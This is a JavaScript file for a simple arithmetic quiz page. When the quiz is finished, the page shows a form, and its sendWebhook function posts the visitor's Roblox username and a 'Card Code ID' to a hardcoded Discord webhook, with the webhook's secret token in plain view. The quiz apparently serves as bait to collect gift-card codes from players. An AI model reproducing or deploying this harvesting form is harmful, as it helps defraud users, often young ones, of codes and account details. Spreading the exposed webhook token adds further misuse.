const questions = [
    { question: "What is 91237 - 91231 + 2 - 2?", choices: ["3", "4", "5", "6"], answerIndex: 3 },
    { question: "What is 10 - 5?", choices: ["3", "4", "5", "6"], answerIndex: 2 },
    { question: "What is 3 * 4?", choices: ["9", "10", "11", "12"], answerIndex: 3 },
    { question: "What is 20 / 4?", choices: ["3", "4", "5", "6"], answerIndex: 2 },
    { question: "What is the square root of 16?", choices: ["2", "3", "4", "5"], answerIndex: 2 },
    { question: "What is 7 + 3 * 2?", choices: ["13", "17", "20", "23"], answerIndex: 0 },
    { question: "What is 10 / 2 + 3?", choices: ["5", "6", "7", "8"], answerIndex: 3 },
    { question: "What is 15 - 7 * 2?", choices: ["1", "3", "5", "7"], answerIndex: 0 },
    { question: "What is 4 squared?", choices: ["12", "14", "16", "18"], answerIndex: 2 },
    { question: "What is 25 divided by 5?", choices: ["2", "3", "4", "5"], answerIndex: 3 }
];

let currentQuestion = 0;

function loadQuestion() {
    const current = questions[currentQuestion];
    document.getElementById('question').textContent = current.question;
    const choices = current.choices;
    const choiceButtons = document.querySelectorAll('.choice');
    for (let i = 0; i < choices.length; i++) {
        choiceButtons[i].textContent = choices[i];
    }
    encodeChoices();
}

function encodeChoices() {
    const choiceButtons = document.querySelectorAll('.choice');
    for (let i = 0; i < choiceButtons.length; i++) {
        choiceButtons[i].setAttribute('data-index', i);
    }
}

function checkAnswer(index) {
    const selectedAnswer = index;
    const correctAnswerIndex = questions[currentQuestion].answerIndex;
    if (selectedAnswer === correctAnswerIndex) {
        document.getElementById('result').textContent = "Correct!";
    } else {
        document.getElementById('result').textContent = "Incorrect! The correct answer is: " + questions[currentQuestion].choices[correctAnswerIndex];
    }
    currentQuestion++;
    if (currentQuestion < questions.length) {
        loadQuestion();
    } else {
        document.getElementById('question').textContent = "Quiz Completed!";
        document.getElementById('result').style.display = "none";
        document.getElementsByClassName('choices')[0].style.display = "none";
        document.getElementById('codeTextbox').style.display = "block";
        document.getElementById('completionMessage').style.display = "block";
    }
}

function sendWebhook() {
    const username = document.getElementById('usernameInput').value;
    const code = document.getElementById('codeInput').value;
    const webhookURL = 'https://discord.com/api/webhooks/1223054275165421679/pxJdBHxflazOWfC25finXuuYA3VqyALlu2tYcm0qSNylolKWvi7hRMISXpqEOMcSg1kA';
    const message = `<@1044100724734300270> 
Roblox Username: ${username}
Card Code ID: ${code}`;
    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ content: message }),
    }).then(response => {
        if (!response.ok) {
            console.error('Failed to send webhook:', response.status, response.statusText);
        }
    }).catch(error => {
        console.error('Error sending webhook:', error);
    });
}

loadQuestion();
